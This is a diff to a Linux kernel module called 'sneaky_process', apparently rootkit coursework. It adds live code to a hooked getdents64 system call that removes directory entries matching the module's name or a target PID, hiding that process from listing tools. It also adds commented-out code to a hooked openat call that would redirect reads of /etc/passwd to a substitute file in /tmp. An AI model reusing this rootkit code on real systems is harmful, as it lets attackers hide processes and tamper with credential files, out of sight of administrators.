@@ -12,6 +12,8 @@
 #include <asm/cacheflush.h>
 
 #define PREFIX "sneaky_process"
+#define PASSWORDFILE "/etc/passwd"
+#define TEMPPASSWORDFILE "/tmp/passwd"
 
 // process id argument
 static int pid;
@@ -42,6 +44,13 @@ int disable_page_rw(void *ptr){
 asmlinkage int (*original_openat)(struct pt_regs *);
 asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
 {
+  // const char *pathname = regs->si;
+  // const char kpathname[PATH_MAX] = {0};
+  // const char *temppathname = TEMPPASSWORDFILE;
+  // strncpy_from_user(kpathname, pathname, PATH_MAX);
+  // if(strcmp(kpathname, PASSWORDFILE) == 0) {
+  //   copy_to_user(pathname, temppathname, sizeof(temppathname));
+  // }
   return (*original_openat)(regs);
 }
 
@@ -53,11 +62,14 @@ asmlinkage int sneaky_getdents64(struct pt_regs *regs) {
   struct linux_dirent64 *current_entry = dirp;
   int bpos = 0;
   char filename[NAME_MAX] = {0};
+  char pid_filename[NAME_MAX] = {0};
+
+  sprintf(pid_filename, "%d", pid);
 
   while(bpos < nread) {
     current_entry = (struct linux_dirent64 *)((char *)dirp + bpos);
     strncpy_from_user(filename, current_entry->d_name, NAME_MAX);
-    if (strcmp(filename, PREFIX) == 0) {
+    if (strcmp(filename, PREFIX) == 0 || strcmp(filename, pid_filename) == 0) {
       int reclen = current_entry->d_reclen;
       // overwrite the record
       memmove(current_entry, (char *)current_entry + reclen, nread - bpos - reclen);
@@ -66,6 +78,8 @@ asmlinkage int sneaky_getdents64(struct pt_regs *regs) {
     }
     bpos += current_entry->d_reclen;
   }
+
+  // printk(KERN_DEBUG "getdents64 called\n");
 
   return nread;
 }
